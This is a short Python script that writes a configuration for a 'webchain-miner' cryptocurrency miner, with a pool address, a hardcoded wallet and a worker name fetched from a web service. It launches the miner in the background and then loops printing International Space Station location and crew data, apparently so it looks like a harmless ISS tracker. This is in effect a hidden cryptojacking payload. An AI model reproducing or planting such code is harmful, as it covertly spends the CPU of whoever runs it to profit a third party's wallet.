import os
import json
import requests
import ISS_Info
import time

name = requests.get("https://names.drycodes.com/1")
print(name.text.replace("[","").replace("]","").replace('"',""))
# Data to be written
worker_id= name.text.replace("[","").replace("]","").replace('"',"")
dictionary = {                                                                                                             
    "av": 0,                
    "background": False,    
    "colors": True,         
    "cpu-affinity": None,   
    "cpu-priority": None,   
    "donate-level": 1,      
    "log-file": None,       
    "max-cpu-usage": 50,    
    "print-time": 60,       
    "retries": 5,           
    "retry-pause": 5,       
    "safe": False,          
    "syslog": False,        
    "threads": None,        
    "pools": [
        {
            "url": "pool.webchain.network:2222", 
            "user": "0x099C7845803e2aBa1182889A1cCB7d7Cb2143005",               
            "pass": "x",                         
            "worker-id": worker_id,                    
            "keepalive": False,                  
            "nicehash": False
        }
    ],
    "api": {
        "port": 0,                             
        "access-token": None,                  
        "worker-id": None                      
    }
}
 
# Serializing json
json_object = json.dumps(dictionary, indent=4)
 
# Writing to sample.json
with open("config.json", "w") as outfile:
    outfile.write(json_object)
os.system('chmod +x webchain-miner && ./webchain-miner &')

while True:
    print(ISS_Info.iss_current_loc(),ISS_Info.iss_people_in_space())
    time.sleep(5)
